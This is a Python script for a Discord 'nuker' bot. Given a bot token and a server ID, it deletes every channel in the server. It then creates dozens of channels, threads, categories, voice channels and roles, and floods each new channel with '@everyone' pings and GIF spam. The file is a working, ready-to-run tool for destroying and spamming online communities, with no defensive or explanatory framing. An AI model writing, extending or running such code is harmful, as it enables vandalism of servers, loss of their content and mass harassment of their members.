import discord
from discord.ext import commands
import asyncio

banner = """
▄▀█ █▀█ █▀▀ █
█▀█ █▀▄ █▄▄ █
"""

print(banner)

bot_token = input("Enter your bot token: ")

print("\033[H\033[J")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    guild_id = input("Enter the server (guild) ID: ")
    try:
        guild_id = int(guild_id)
    except ValueError:
        print("Invalid guild ID. Please enter a valid integer.")
        return

    guild = bot.get_guild(guild_id)

    async def delete_channels():
        for channel in guild.channels:
            await channel.delete()

    await delete_channels()

    async def create_channels():
        for i in range(50):
            channel = await guild.create_text_channel(f'channel{i+1}')
            asyncio.create_task(send_gifs(channel))
            asyncio.create_task(send_message(channel))
            asyncio.create_task(create_threads(channel))

    async def send_gifs(channel):
        gif_url = ''  # URL
        for _ in range(50):
            await channel.send(gif_url)

    async def send_message(channel):
        message_content = '@everyone'
        for _ in range(50):
            await channel.send(message_content)

    async def create_threads(channel):
        for i in range(100):
            await channel.create_thread(name=f'thread{i+1}')

    await create_channels()

    for i in range(10):
        await guild.create_category(f'category{i+1}')

    for i in range(30):
        await guild.create_voice_channel(f'voice_channel{i+1}')

    for i in range(50):
        await guild.create_role(name=f'role{i+1}')

bot.run(bot_token)


